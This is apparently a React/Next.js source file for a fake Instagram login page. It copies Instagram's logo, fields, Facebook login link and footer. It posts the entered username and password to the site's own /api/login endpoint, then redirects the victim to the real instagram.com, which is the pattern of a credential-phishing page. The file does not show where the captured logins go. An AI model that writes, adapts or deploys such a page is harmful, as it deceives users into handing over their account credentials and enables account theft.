"use client";

import { useState, ChangeEvent, FormEvent } from "react";
import axios, { AxiosResponse } from "axios";

const LoginPage = () => {
  const [username, setUsername] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState<boolean>(false);

  const login = async (e: FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const response: AxiosResponse = await axios.post("/api/login", {
        username,
        password,
      });

      if (response.status === 201) {
        window.location.href = "https://instagram.com";
        setLoading(false);
      } else {
        setError(`There was an error, please try again. Status code: ${response.status}`);
        setLoading(false);
      }
    } catch (error: any) {
      setError(
        error.response?.data?.message || "Server error, please try again later."
      );
      setLoading(false);
    }
  };

  return (
    <>
      <main>
        <div className="log-in-container">
          <div className="log-in">
            <img src="/photos/logo.png" alt="Instagram Logo" className="logo" />
            <div className="log-in-form">
              <form onSubmit={login}>
                <input
                  required
                  type="text"
                  placeholder="Phone number, username, or email"
                  value={username}
                  onChange={(e: ChangeEvent<HTMLInputElement>) => setUsername(e.target.value)}
                />
                <input
                  required
                  type="password"
                  placeholder="Password"
                  onChange={(e: ChangeEvent<HTMLInputElement>) => setPassword(e.target.value)}
                  value={password}
                />
                <button className="log-in-button" type="submit">
                  {loading ? "Logging In ..." : "Log In"}
                </button>
              </form>
              {error && <div className="error-message">{error}</div>}
            </div>

            <span className="or-divider">OR</span>

            <div className="fb-login">
              <a href="#">
                <img src="/photos/facebook-icon.png" alt="Facebook Logo" />
                <span>Log in with Facebook</span>
              </a>
            </div>

            <a href="#">Forgot password?</a>
          </div>

          <div className="get-the-app">
            <span>Get the app</span>
            <div className="app-images">
              <a href="#">
                <img src="/photos/applestore.png" alt="App Store" />
              </a>
              <a href="#">
                <img src="/photos/googlestore.png" alt="Google Play" />
              </a>
            </div>
          </div>
        </div>

        <div className="phones-container">
          <img src="/photos/phones.png" alt="Phones" />
        </div>
      </main>

      <footer>
        <ul className="footer-links">
          <li><a href="#">ABOUT</a></li>
          <li><a href="#">HELP</a></li>
          <li><a href="#">PRESS</a></li>
          <li><a href="#">API</a></li>
          <li><a href="#">JOBS</a></li>
          <li><a href="#">PRIVACY</a></li>
          <li><a href="#">TERMS</a></li>
          <li><a href="#">LOCATION</a></li>
          <li><a href="#">TOP</a></li>
          <li><a href="#">ACCOUNTS</a></li>
          <li><a href="#">HASHTAGS</a></li>
          <li><a href="#">LANGUAGE</a></li>
        </ul>
        <span className="copyright">&copy; 2020 INSTAGRAM FROM FACEBOOK</span>
      </footer>
    </>
  );
};

export default LoginPage;
